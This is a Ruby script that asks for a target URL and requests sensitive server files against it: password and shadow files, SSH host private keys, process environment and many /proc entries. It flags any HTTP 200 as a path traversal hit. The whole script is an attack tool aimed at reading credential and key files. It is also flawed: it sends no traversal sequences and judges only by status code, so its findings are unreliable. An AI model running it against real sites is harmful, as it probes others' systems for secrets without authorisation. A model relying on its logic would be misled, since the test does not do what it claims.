require 'net/http'
require 'colorize'

PAYLOADS = [
  '/etc/passwd',
  '/etc/shadow',
  '/etc/hosts',
  '/etc/hostname',
  '/etc/apache2/sites-available/default',
  '/etc/apache2/apache2.conf',
  '/etc/nginx/nginx.conf',
  '/etc/mysql/my.cnf',
  '/etc/ssh/sshd_config',
  '/etc/ssh/ssh_host_rsa_key',
  '/etc/ssh/ssh_host_dsa_key',
  '/etc/ssh/ssh_host_ecdsa_key',
  '/etc/ssh/ssh_host_ed25519_key',
  '/proc/self/environ',
  '/proc/version',
  '/proc/cmdline',
  '/proc/cpuinfo',
  '/proc/mounts',
  '/proc/net/route',
  '/proc/net/tcp',
  '/proc/net/udp',
  '/proc/net/icmp',
  '/proc/net/dev',
  '/proc/net/wireless',
  '/proc/sys/kernel/hostname',
  '/proc/sys/kernel/osrelease',
  '/proc/sys/kernel/version',
  '/proc/sys/kernel/ostype',
  '/proc/sys/kernel/panic',
  '/proc/sys/kernel/random/boot_id',
  '/proc/sys/kernel/random/entropy_avail',
  '/proc/sys/kernel/random/poolsize',
  '/proc/sys/kernel/threads-max',
  '/proc/sys/kernel/tainted',
  '/proc/sys/net/ipv4/ip_forward',
  '/proc/sys/net/ipv4/tcp_syncookies',
  '/proc/sys/net/ipv4/icmp_echo_ignore_all',
  '/proc/sys/net/ipv4/icmp_echo_ignore_broadcasts',
  '/proc/sys/net/ipv4/icmp_ignore_bogus_error_responses',
  '/proc/sys/net/ipv4/tcp_max_syn_backlog',
  '/proc/sys/net/ipv4/tcp_rfc1337',
  '/proc/sys/net/ipv4/tcp_sack',
  '/proc/sys/net/ipv4/tcp_synack_retries',
  '/proc/sys/net/ipv4/tcp_syn_retries',
  '/proc/sys/net/ipv4/tcp_timestamps',
  '/proc/sys/net/ipv4/tcp_window_scaling',
  '/proc/sys/net/ipv4/tcp_tw_recycle',
  '/proc/sys/net/ipv4/tcp_tw_reuse'
]

def test_path_traversal(url)
  puts "Testing for Path Traversal vulnerability on #{url}...".yellow
  PAYLOADS.each do |payload|
    full_url = "#{url}/#{payload}"
    response = Net::HTTP.get_response(URI.parse(full_url))
    if response.code == '200'
      puts "Potential vulnerability found with payload: #{payload}".red
    elsif response.code == '404'
      puts "Payload #{payload} not found.".green
    else
      puts "Unexpected response code #{response.code} for payload #{payload}".yellow
    end
  end
end

def main
  puts "Enter your target website URL: "
  target_url = gets.chomp
  
  test_path_traversal(target_url)
end

main
